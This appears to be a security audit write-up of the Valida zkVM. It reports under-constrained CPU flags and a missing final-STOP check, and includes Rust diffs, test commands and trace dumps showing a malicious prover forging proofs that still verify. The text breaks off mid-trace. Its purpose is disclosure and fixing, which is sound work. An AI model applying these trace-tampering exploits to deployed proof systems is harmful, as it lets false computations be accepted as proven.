## Finding 1: is_stop of the CPU chip can take arbitrary values, even when the instruction is not STOP

The `is_stop` flag should be true only for the STOP instruction. Moreover, when `is_stop` is true during the transition, `next.pc` must be zero. However, without a boolean constraint, `is_stop` may take any non-zero value during the transition when the program counter wraps around to zero.

#### PoC

Consider the following program consisting of four instructions:

```rust
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([4, 0, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 0, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([16, 0, 0, 0, 1]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);
```

By initializing the program counter (pc) to 2013265918, the fourth row’s pc wraps around to 0. Note that there are no range constraints for the value of pc. As a result, the third row, which executes an Add32 instruction, can have an arbitrary value in its `is_stop` column, violating the intended semantics.

A concrete proof of concept is available at: https://github.com/Koukyosyumei/valida-vm/tree/hideaki-poc-3:

To reproduce,

```bash
cd basic-api
cargo test prove_small_add --release
```

- Result

```bash
....

^^^^^^^^^^^^^ Malformed Program Traces ^^^^^^^^^^^^^
ProgramCols { pc: 2013265918, opcode: 7, operands: Operands([4, 0, 0, 0, 0]), imm: Word([0, 0, 0, 0]) }
ProgramCols { pc: 2013265919, opcode: 7, operands: Operands([0, 0, 0, 0, 0]), imm: Word([0, 0, 0, 0]) }
ProgramCols { pc: 2013265920, opcode: 100, operands: Operands([16, 0, 0, 0, 1]), imm: Word([0, 0, 0, 0]) }
ProgramCols { pc: 0, opcode: 8, operands: Operands([0, 0, 0, 0, 0]), imm: Word([0, 0, 0, 0]) }
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

....

^^^^^^^^^^^^^^ Malformed CPU Traces ^^^^^^^^^^^^^^^^^^
CpuCols { clk: 0, pc: 2013265918, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([4, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4100, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CpuCols { clk: 1, pc: 2013265919, fp: 4096, instruction: InstructionCols { opcode: 7, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4096, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CpuCols { clk: 2, pc: 2013265920, fp: 4096, instruction: InstructionCols { opcode: 100, operands: Operands([16, 0, 0, 0, 1]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 1, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1234, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 1, addr: 4096, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4112, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CpuCols { clk: 3, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 8, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

...

thread 'prove_small_add' panicked at basic-api/tests/test_prover.rs:1075:5:
Verification should fail.
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace


failures:
    prove_small_add
```

#### Recommendation

The issue can be resolved by explicitly enforcing a Boolean constraint on the `is_stop` column and checking that all other opcode flags are zero.

```rust
builder.assert_bool(local.is_stop);
builder.assert_zero(sum_of_other_opcode_flags);
```

```rs
#![feature(trait_upcasting)]
use core::marker::PhantomData;

use std::borrow::BorrowMut;
use valida_cpu::columns::{CpuCols, CpuPublicVector};
use valida_program::columns::ProgramCols;

use std::fs::File;
use std::io::Write;
use std::ops::RangeInclusive;
@@ -1051,9 +1055,25 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {

        // Generate public traces.
        let t_public_traces = start_timer!(|| "valida >machine.prove(..) | public_traces");
        let public_traces = self.generate_public_traces(config, show_public, show_public_dims);
        let mut public_traces = self.generate_public_traces(config, show_public, show_public_dims);
        end_timer!(t_public_traces);

        if let Some(PublicTrace::PublicVector(initial_register_values)) = public_traces[0].as_mut()
        {
            // initial_pc
            initial_register_values.0[0] = SC::Val::from_canonical_u32(2013265918);
        }
        if let Some(PublicTrace::PublicMatrix(program_trace)) = public_traces[1].as_mut() {
            println!("^^^^^^^^^^^^^ Malformed Program Traces ^^^^^^^^^^^^^");
            for i in 0..program_trace.height() {
                let program_row = program_trace.row_mut(i);
                let program_row: &mut ProgramCols<SC::Val> = program_row.borrow_mut();
                program_row.pc = program_row.pc + SC::Val::from_canonical_u32(2013265918);
                println!("{:?}", program_row);
            }
            println!("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
        }

        // Commit to the public trace
        let (public_commit, public_data) =
            BasicMachine::<F>::commit_to_public_trace::<SC>(&public_traces, pcs, &mut challenger);
@@ -1069,9 +1089,28 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {

        // Generate main traces.
        let t_main_traces = start_timer!(|| "valida >machine.prove(..) | main_traces");
        let main_traces = self.generate_main_traces(config, show_main, show_main_dims);
        let mut main_traces = self.generate_main_traces(config, show_main, show_main_dims);
        end_timer!(t_main_traces);

        let mut traces_01 = &mut main_traces.split_at_mut(1);
        let mut cpu_trace = &mut traces_01.0[0];

        if let Some(cpu_trace) = cpu_trace.as_mut() {
            println!("^^^^^^^^^^^^^^ Malformed CPU Traces ^^^^^^^^^^^^^^^^^^");
            {
                let cpu_row = cpu_trace.row_mut(2);
                let cpu_row: &mut CpuCols<SC::Val> = cpu_row.borrow_mut();
                cpu_row.opcode_flags.is_stop = SC::Val::from_canonical_u32(1234);
            }
            for i in 0..cpu_trace.height() {
                let cpu_row = cpu_trace.row_mut(i);
                let cpu_row: &mut CpuCols<SC::Val> = cpu_row.borrow_mut();
                cpu_row.pc = cpu_row.pc + SC::Val::from_canonical_u32(2013265918);
                println!("{:?}", cpu_row);
            }
            println!("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
        }

        let has_main_traces = has_traces(&main_traces);

        // Commit to main traces.
@@ -1354,12 +1393,25 @@ impl<F: StarkField> Machine<F> for BasicMachine<F> {
        let g_subgroups = compute_g_subgroups::<F, SC>(&proof.chip_proofs);

        // Generate public traces
        let public_traces: [Option<PublicTrace<SC::Val>>; NUM_CHIPS] = instance_data
        let mut public_traces: [Option<PublicTrace<SC::Val>>; NUM_CHIPS] = instance_data
            .public_traces(show_public)[0]
            .clone()
            .try_into()
            .unwrap();

        if let Some(PublicTrace::PublicVector(initial_register_values)) = public_traces[0].as_mut()
        {
            // initial_pc
            initial_register_values.0[0] = SC::Val::from_canonical_u32(2013265918);
        }
        if let Some(PublicTrace::PublicMatrix(program_trace)) = public_traces[1].as_mut() {
            for i in 0..program_trace.height() {
                let program_row = program_trace.row_mut(i);
                let program_row: &mut ProgramCols<SC::Val> = program_row.borrow_mut();
                program_row.pc = program_row.pc + SC::Val::from_canonical_u32(2013265918);
            }
        }

        // Commit to the public trace to get the public commitment
        let (public_commit, _) =
            BasicMachine::<F>::commit_to_public_trace::<SC>(&public_traces, pcs, &mut challenger);
  32 changes: 32 additions & 0 deletions32  
basic-api/tests/test_prover.rs
Original file line number	Diff line number	Diff line change
@@ -47,6 +47,31 @@ use valida_machine::__internal::p3_commit::ExtensionMmcs;
mod common;
use common::*;

fn add_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([4, 0, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([0, 0, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([16, 0, 0, 0, 1]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1068,13 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

#[test]
fn prove_small_add() {
    let program = add_program::<BabyBear>();
    let (_machine, _memory_backend) = prove_program(program, ProgramTableType::Public);
    assert!(false, "Verification should fail.");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
```

## Finding 2. Under-constrained is_beq Flag Allows Malformed PC Transitions


The AIR for the CPU chip does not enforce that `opcode_flags.is_beq` must match `instruction.opcode == BEQ`. Consequently, a malicious prover can flip `is_beq` from 1 to 0 even when executing a BEQ, causing the `next.pc` logic to fall back to `local.pc + 1` even if the branch condition is met, yielding invalid traces that can still pass the verification.

See also #14.

## PoC

The concrete PoC is available at https://github.com/Koukyosyumei/valida-vm/tree/hideaki-poc-6:

Reproduce steps:

```bash
cd basic-api
cargo test prove_beq --release
```

Specifically, this Poc considers the following program:

```rust
fn beq_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BeqInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}
```

The expected transition of `pc` is `0 → 1 → 2 → 1 → 2 → 3`.

However, consider the following modification of `cpu/src/lib.rs`.

```rust

                cols.opcode_flags.is_jalv = SC::Val::one();
            }
            Operation::Beq(imm) => {
+                //cols.opcode_flags.is_beq = SC::Val::one();
                self.set_imm_value(cols, *imm);
            }
            Operation::Bne(imm) => {
	@@ -1066,11 +1066,11 @@ where
            state.machine.push_op(Operation::Beq(imm), opcode, ops);
        }

+      //if cell_1 == cell_2 {
+      //    state.machine.set_pc((ops.a() as u32) / BYTES_PER_INSTR);
+      //} else {
        state.machine.step_pc();
+      //}
    }
}
```

This modification produces the malicious transition of `pc`: `0 → 1 → 2 → 3`, while the resulting proof can still pass all verifications.

```rs
@@ -47,6 +47,32 @@ use valida_machine::__internal::p3_commit::ExtensionMmcs;
mod common;
use common::*;

fn beq_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let bytes_per_instr = BYTES_PER_INSTR as i32;

    let mut program = vec![];
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, -8, 1, 0, 1]),
        },
        InstructionWord {
            opcode: <BeqInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([1 * bytes_per_instr, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);

    program
}

fn div_program<Val: StarkField>() -> Vec<InstructionWord<i32>> {
    let mut program = vec![];

@@ -1043,6 +1069,13 @@ fn expected_sdiv_memory_state(memory_backend: &ValidaMemoryBackend) {
    );
}

#[test]
fn prove_beq() {
    let program = beq_program::<BabyBear>();
    let (_machine, _memory_backend) = prove_program(program, ProgramTableType::Public);
    assert!(false, "Verification should fail.");
}

#[test]
fn prove_sdiv() {
    let program = sdiv_program::<BabyBear>();
  12 changes: 6 additions & 6 deletions12  
cpu/src/lib.rs
Original file line number	Diff line number	Diff line change
@@ -470,7 +470,7 @@ impl CpuChip {
                cols.opcode_flags.is_jalv = SC::Val::one();
            }
            Operation::Beq(imm) => {
                cols.opcode_flags.is_beq = SC::Val::one();
                //cols.opcode_flags.is_beq = SC::Val::one();
                self.set_imm_value(cols, *imm);
            }
            Operation::Bne(imm) => {
@@ -1066,11 +1066,11 @@ where
            state.machine.push_op(Operation::Beq(imm), opcode, ops);
        }

        if cell_1 == cell_2 {
            state.machine.set_pc((ops.a() as u32) / BYTES_PER_INSTR);
        } else {
            state.machine.step_pc();
        }
        //if cell_1 == cell_2 {
        //    state.machine.set_pc((ops.a() as u32) / BYTES_PER_INSTR);
        //} else {
        state.machine.step_pc();
        //}
    }
}

```

## Finding 3: Execution Can Stop at Arbitrary Point

Currently, the constraint does not enforce that the last executed opcode is `STOP`. This allows a malicious prover to halt execution at an arbitrary point while still generating a valid proof, effectively bypassing intended program behaviour.

Currently, the CPU chip enforces that the `is_stop` flag must be set on the last row of the last segment ([here](https://github.com/lita-xyz/valida-vm/blob/3d8ebc4714ef068beb9e1edc2d3ebac48169f8aa/cpu/src/stark.rs#L88)). However, this check does not extend to the padded trace, where the final instruction may occur before the last row.

A working PoC is available here: https://github.com/Koukyosyumei/valida-vm/tree/poc-mal-DidStop-flag (this poc is the fork of https://github.com/lita-xyz/valida-vm/pull/15)

Run with:

```
cd basic-api
cargo test prove_small_add --release
```

This PoC considers the following program:

```rust
    program.extend([
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-4, 1, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Imm32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-8, 2, 0, 0, 0]),
        },
        InstructionWord {
            opcode: <Add32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-12, -8, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <Sub32Instruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands([-12, -12, -4, 0, 0]),
        },
        InstructionWord {
            opcode: <StopInstruction as Instruction<BasicMachine<Val>, Val>>::OPCODE,
            operands: Operands::default(),
        },
    ]);
```

This program is expected to produce the following traces:

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 97, opcode_hi28: 6, opcode_lo4: 1, operands: Operands([2013265917, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 97, opcode_hi28: 6, opcode_lo4: 1, operands: Operands([2013265913, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 2: CpuCols { clk: 2, pc: 2, fp: 4096, instruction: InstructionCols { opcode: 100, opcode_hi28: 6, opcode_lo4: 4, operands: Operands([2013265909, 2013265913, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 1, diff_inv: 1, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4084, value: Word([3, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 3: CpuCols { clk: 3, pc: 3, fp: 4096, instruction: InstructionCols { opcode: 101, opcode_hi28: 6, opcode_lo4: 5, operands: Operands([2013265909, 2013265909, 2013265917, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 1, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 4, diff_inv: 1509949441, not_equal: 1, mem_read_channels: [ReadChannelCols { used: 1, addr: 4084, value: Word([3, 0, 0, 0]) }, ReadChannelCols { used: 1, addr: 4092, value: Word([1, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4084, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 4: CpuCols { clk: 4, pc: 4, fp: 4096, instruction: InstructionCols { opcode: 113, opcode_hi28: 7, opcode_lo4: 1, operands: Operands([0, 0, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 0, is_advice: 0, is_stop: 1, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }

Main trace for Chip: Memory
--------------------------------------------------------------------------------
Memory row 0: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 2, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 1: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([3, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 2: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([3, 0, 0, 0]), clk: 3, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 3: MemoryCols { addr: 4084, addr_bytes: Word([244, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 3, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 4: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 1, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 5: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 1, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 6: MemoryCols { addr: 4088, addr_bytes: Word([248, 15, 0, 0]), value: Word([2, 0, 0, 0]), clk: 2, diff_bytes: Word([4, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 4, diff_inv: 1509949441, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 7: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([0, 0, 0, 0]), clk: 0, diff_bytes: Word([0, 0, 0, 0]), is_dummy_read: 1, is_read: 0, is_write: 0, diff: 0, diff_inv: 0, addr_equal: 1, is_initial: 1, prior_timestamp: 0, is_zero_initialized: 1, is_final: 0, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 8: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 0, diff_bytes: Word([2, 0, 0, 0]), is_dummy_read: 0, is_read: 0, is_write: 1, diff: 2, diff_inv: 1006632961, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 9: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 2, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 1, diff_inv: 1, addr_equal: 1, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
Memory row 10: MemoryCols { addr: 4092, addr_bytes: Word([252, 15, 0, 0]), value: Word([1, 0, 0, 0]), clk: 3, diff_bytes: Word([1, 0, 0, 0]), is_dummy_read: 0, is_read: 1, is_write: 0, diff: 1, diff_inv: 1, addr_equal: 0, is_initial: 0, prior_timestamp: 1, is_zero_initialized: 0, is_final: 1, is_static_write: 0, skip_persistent_send: 1, skip_persistent_receive: 0 }
```

By modifying the [step](https://github.com/Koukyosyumei/valida-vm/blob/d6a9218d48a62f68034a86bdf5d1eea042b1ba43/basic-api/src/machine/basic.rs#L1551) function to incorrectly return a stop flag after an `ADD` instruction:

```rust
else if opcode == <Add32Instruction as Instruction<Self, F>>::OPCODE {
    StoppingFlag::DidStop
}
```

The program halts before reaching the `SUB` and `STOP` instructions. Despite this, the system still produces a “valid” proof for the truncated execution trace.

```
Main trace for Chip: CPU
--------------------------------------------------------------------------------
CPU row 0: CpuCols { clk: 0, pc: 0, fp: 4096, instruction: InstructionCols { opcode: 97, opcode_hi28: 6, opcode_lo4: 1, operands: Operands([2013265917, 1, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4092, value: Word([1, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
CPU row 1: CpuCols { clk: 1, pc: 1, fp: 4096, instruction: InstructionCols { opcode: 97, opcode_hi28: 6, opcode_lo4: 1, operands: Operands([2013265913, 2, 0, 0, 0]) }, opcode_flags: OpcodeFlagCols { is_bus_op: 0, is_pointer_op: 0, is_imm_op: 0, is_left_imm_op: 0, is_load: 0, is_load_u8: 0, is_load_s8: 0, is_store: 0, is_store_u8: 0, is_beq: 0, is_bne: 0, is_jal: 0, is_jalv: 0, is_imm32: 1, is_advice: 0, is_stop: 0, is_loadfp: 0, is_write: 0 }, diff: 0, diff_inv: 0, not_equal: 0, mem_read_channels: [ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }, ReadChannelCols { used: 0, addr: 0, value: Word([0, 0, 0, 0]) }], mem_write_channels: [WriteChannelCols { used: 1, addr: 4088, value: Word([2, 0, 0, 0]), old_value: Word([0, 0, 0, 0]) }], addr_offset_flags: Word([0, 0, 0, 0]), sign_bit: 0, is_last_segment: 1, is_real: 1 }
